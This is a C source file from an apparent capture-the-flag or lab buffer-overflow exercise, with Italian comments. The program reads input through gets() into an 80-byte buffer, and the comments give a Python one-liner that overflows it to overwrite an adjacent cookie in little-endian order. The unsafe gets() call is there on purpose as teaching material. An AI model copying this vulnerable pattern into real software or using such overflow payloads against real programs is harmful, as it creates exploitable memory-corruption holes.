#include <stdio.h>

int main() {
    int cookie;
    char buf[80]; //ho un buffer da 80 caratteri

    printf("buf: %08x cookie: %08x\n", &buf, &cookie);
    gets(buf);

    if (cookie == 0x01020305)
        printf("y0u w1n!\n");
}

//comando "soluzione": python -c 'print "a"*80 + "\x05\x03\x02\x01"' | ./bof1 
//perche`?
//80*a e arrivo alla fine del buffer: dopo serve inserire il cookie, in che 
// ordine? al contrario --> per come e` impostata la memoria!!

//python -c : ovvero cmd -> program passed in as string (terminates option list)
//quindi si creano gli input, prima il buffer di 80 caratteri e poi il cookie, che grazie al binario vediamo che deve essere pari ai valori richiesti -> per ottenere 0x01020305 bisogna inserirlo al contrario
//quindi si inseriscono 80 caratteri qualsiasi per il buffer: "a"*80 e poi il cookier al contrario: "\x05\x03\x02\x01"
